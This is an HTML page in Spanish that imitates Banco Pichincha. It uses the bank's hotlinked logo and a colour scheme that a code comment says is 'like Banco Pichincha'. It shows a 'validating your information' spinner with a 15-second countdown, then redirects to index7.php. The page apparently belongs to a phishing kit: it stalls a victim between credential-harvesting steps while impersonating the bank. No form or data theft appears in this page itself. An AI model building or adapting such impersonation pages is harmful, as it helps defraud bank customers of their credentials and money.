<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="15;url=index7.php">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Validando Información</title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background-color: #FEDD00; /* Amarillo tipo Banco Pichincha */
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      color: #222;
    }

    img.logo {
      width: 200px;
      margin-bottom: 15px;
    }

    h1 {
      font-size: 1em;
      margin: 10px 0;
      font-weight: 500;
    }

    .countdown {
      font-size: 2em;
      font-weight: bold;
      margin: 10px 0;
      color: #004F9F;
      text-shadow: 1px 1px 1px rgba(0,0,0,0.1);
    }

    .spinner {
      border: 6px solid rgba(0, 0, 0, 0.1);
      border-top: 6px solid #004F9F;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 10px 0;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    footer {
      position: absolute;
      bottom: 15px;
      font-size: 0.75em;
      color: #333;
    }
  </style>
</head>
<body>
  <!-- Logo del Banco Pichincha -->
  <img src="https://bancaweb.pichincha.com/assets/logo.svg" alt="Banco Pichincha" class="logo">

  <div class="spinner"></div>
  <h1>Estamos validando su información</h1>
  <div class="countdown" id="countdown">15</div>

  <footer>Todos los derechos reservados © 2025</footer>

  <script>
    let seconds = 15;
    const countdownEl = document.getElementById('countdown');
    const interval = setInterval(() => {
      seconds--;
      countdownEl.textContent = seconds;
      if (seconds <= 0) {
        clearInterval(interval);
      }
    }, 1000); // ← corregido a 1 segundo real
  </script>
</body>
</html>
